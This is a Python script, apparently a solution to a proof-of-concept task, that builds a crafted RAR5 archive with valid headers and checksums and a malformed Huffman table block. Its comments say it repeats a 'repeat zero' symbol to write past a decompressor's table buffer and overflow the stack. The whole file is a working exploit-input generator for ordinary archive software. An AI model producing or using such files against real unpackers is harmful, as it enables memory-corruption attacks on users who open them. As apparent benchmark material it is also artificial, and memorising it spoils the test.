import struct
import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        def crc32(data):
            return binascii.crc32(data) & 0xFFFFFFFF

        def to_varint(n):
            if n == 0:
                return b'\x00'
            res = bytearray()
            while n > 0x7F:
                res.append((n & 0x7F) | 0x80)
                n >>= 7
            res.append(n)
            return res

        class BitWriter:
            def __init__(self):
                self.bytes = bytearray()
                self.curr_byte = 0
                self.bit_count = 0

            def write_bits(self, value, count):
                value &= (1 << count) - 1
                while count > 0:
                    bits_to_write = min(count, 8 - self.bit_count)
                    shift = count - bits_to_write
                    chunk = (value >> shift) & ((1 << bits_to_write) - 1)
                    out_shift = 8 - self.bit_count - bits_to_write
                    self.curr_byte |= (chunk << out_shift)
                    self.bit_count += bits_to_write
                    count -= bits_to_write
                    if self.bit_count == 8:
                        self.bytes.append(self.curr_byte)
                        self.curr_byte = 0
                        self.bit_count = 0

            def flush(self):
                if self.bit_count > 0:
                    self.bytes.append(self.curr_byte)
                    self.curr_byte = 0
                    self.bit_count = 0
            
            def get_data(self):
                return self.bytes

        # 1. Signature
        sig = b'\x52\x61\x72\x21\x1A\x07\x01\x00'
        
        # 2. Main Header
        mh_body = b'\x00' # Flags: 0
        mh_type_bytes = to_varint(1)
        mh_size_bytes = to_varint(len(mh_type_bytes) + len(mh_body))
        mh_to_hash = mh_size_bytes + mh_type_bytes + mh_body
        mh_crc = crc32(mh_to_hash)
        main_header = struct.pack('<I', mh_crc) + mh_to_hash
        
        # 3. Payload Generation (Compressed Data)
        bw = BitWriter()
        # Block Flags: 0x80 (Table present)
        bw.write_bits(0x80, 8)
        
        # Pre-code Bit Lengths (20 * 4 bits)
        # We define a Huffman tree where:
        # Index 0 has length 1 -> Code '0'
        # Index 18 has length 1 -> Code '1'
        # Others have length 0 (unused)
        
        # Index 0: 1
        bw.write_bits(1, 4)
        # Index 1-17: 0
        for _ in range(17):
            bw.write_bits(0, 4)
        # Index 18: 1
        bw.write_bits(1, 4)
        # Index 19: 0
        bw.write_bits(0, 4)
        
        # Main Table RLE Payload
        # We want to write out of bounds of the table buffer (size ~382).
        # We use Symbol 18 (Repeat zero long).
        # Code for Symbol 18 is '1'.
        # Symbol 18 takes 7 extra bits for count (11-138).
        # We use count 127 (max) -> 138 zeros.
        # Sequence: 1 (code) + 1111111 (count) = 11111111 (0xFF).
        # Repeat enough times to overflow stack buffer.
        # ~470 bytes of payload generates >60k zeros.
        for _ in range(470):
            bw.write_bits(0xFF, 8)
            
        bw.flush()
        compressed_data = bw.get_data()
        
        # 4. File Header
        fh_flags = 0x0004 # Data CRC present
        fh_extra = 0
        fh_data_size = len(compressed_data)
        fh_unpacked = 100000 
        fh_attr = 0
        fh_datacrc = crc32(compressed_data)
        fh_comp = 0x03 # Method 3, 128KB Dict
        fh_os = 0
        fh_name = b'poc'
        
        fh_body = bytearray()
        fh_body.extend(to_varint(fh_flags))
        fh_body.extend(to_varint(fh_extra))
        fh_body.extend(to_varint(fh_data_size))
        fh_body.extend(to_varint(fh_unpacked))
        fh_body.extend(to_varint(fh_attr))
        fh_body.extend(struct.pack('<I', fh_datacrc))
        fh_body.extend(to_varint(fh_comp))
        fh_body.extend(to_varint(fh_os))
        fh_body.extend(to_varint(len(fh_name)))
        fh_body.extend(fh_name)
        
        fh_type_bytes = to_varint(2)
        fh_size_bytes = to_varint(len(fh_type_bytes) + len(fh_body))
        
        fh_to_hash = fh_size_bytes + fh_type_bytes + fh_body
        fh_header_crc = crc32(fh_to_hash)
        file_header = struct.pack('<I', fh_header_crc) + fh_to_hash
        
        return sig + main_header + file_header + compressed_data